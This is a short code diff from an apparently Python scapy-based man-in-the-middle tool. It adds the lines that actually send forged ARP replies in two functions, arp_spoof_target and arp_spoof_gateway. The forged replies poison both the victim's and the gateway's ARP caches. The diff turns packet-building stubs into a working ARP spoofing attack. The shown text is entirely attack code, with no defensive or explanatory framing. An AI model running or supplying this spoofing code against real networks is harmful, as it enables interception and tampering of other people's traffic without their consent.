@@ -34,10 +34,12 @@ def mitm_mac(mitm_interface):
 
 def arp_spoof_target(target_ip, target_mac, gateway_ip):
     packet = scapy.ARP(op=2, pdst=str(target_ip), hwdst=(target_mac), psrc=(gateway_ip))
+    scapy.send(packet)
 
 
 def arp_spoof_gateway(target_ip, gateway_mac, gateway_ip):
     packet = scapy.ARP(op=2, pdst=str(gateway_ip), hwdst=(gateway_mac), psrc=(target_ip))
+    scapy.send(packet)
 
 # target_ip = input("Target IP Address: ")
 # target_mac = input("Target MAC Address: ")
